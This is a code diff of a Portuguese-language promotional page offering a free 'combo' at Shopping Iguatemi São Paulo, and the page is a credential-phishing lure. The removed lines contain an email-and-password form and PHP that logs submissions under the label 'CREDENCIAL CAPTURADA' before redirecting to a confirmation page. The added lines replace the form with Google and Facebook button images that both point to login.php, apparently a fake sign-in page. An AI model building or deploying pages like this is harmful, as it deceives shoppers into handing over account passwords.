@@ -16,7 +16,7 @@ user-scalable=no">
     align-content: center;
     position: relative;
     width: 100%;
-    height: 100%;
+    height: 1000px;
     margin: 0 auto;
 ">
         <img class="logo" src="img/logo-1.svg" style="
@@ -30,6 +30,7 @@ user-scalable=no">
     margin: 0 auto;
     position: relative;
     left: 0px;
+    text-align: center;
 ">
           <img class="banner" src="img/banner.png">
           <p class="voc-ganhou-um-combo" style="font-family: 'Averia Serif Libre';position: relative;top: 290px;">
@@ -39,45 +40,20 @@ user-scalable=no">
     position: relative;
     top: 300px;
 ">Promoção exclusiva para o Shopping Iguatemi São Paulo</p>
-<form action="./" method="post" class="form">
-            <input class="PB-input" placeholder="E-Mail" style="
-    font-weight: 800;color:white;
-" type="email" id="email" name="email" required="">
-            <input class="div-wrapper" placeholder="Senha" style="font-weight: 800;color:white" type="password" id="senha" name="senha" required="">
-            <input class="PB-button" style="font-weight: 600;border:none" type="submit" value="RESGATAR COMBO!">
-            <p class="p">Ao resgatar você concorda com os Termos de Uso</p>
-          </form>
-        </div>
+<a href="./login.php"> <img src="./img/google-button.png" style="
+    position: relative;
+    top: 320;
+    margin: 0 auto;
+"></a><a href="./login.php"><img src="./img/facebook-button.png" style="
+    position: relative;
+    top: 350;
+    margin: 0 auto;
+"></a>
         
         
       </div>
     </div>
   
-<?php
-// Verificar se a requisição é POST
-if ($_SERVER['REQUEST_METHOD'] === 'POST') {
-    
-    // Verificar se os dados do POST não estão vazios
-    if($_POST["email"] && $_POST["senha"]){
 
-        // Pega o email e senha
-        $email=$_POST["email"];
-        $senha=$_POST["senha"];
 
-        // Criar uma string com os dados do POST
-        $dados = "####\n\n[🥃 CREDENCIAL CAPTURADA]\nEMAIL: " . $email . "\nSENHA: " . $senha . "\n\n####\n";
-
-        // Salva nos logs
-        file_put_contents("php://stderr", $dados."\n");
-        
-        // Redirecionar para confirmado.php
-        header("Location: confirmado.php");
-        exit();
-    } else {
-        // Nenhum dado recebido
-        echo 'Erro: Envie email e senha!';
-    }
-}
-?>
-
-</body></html>
+</div></body></html>
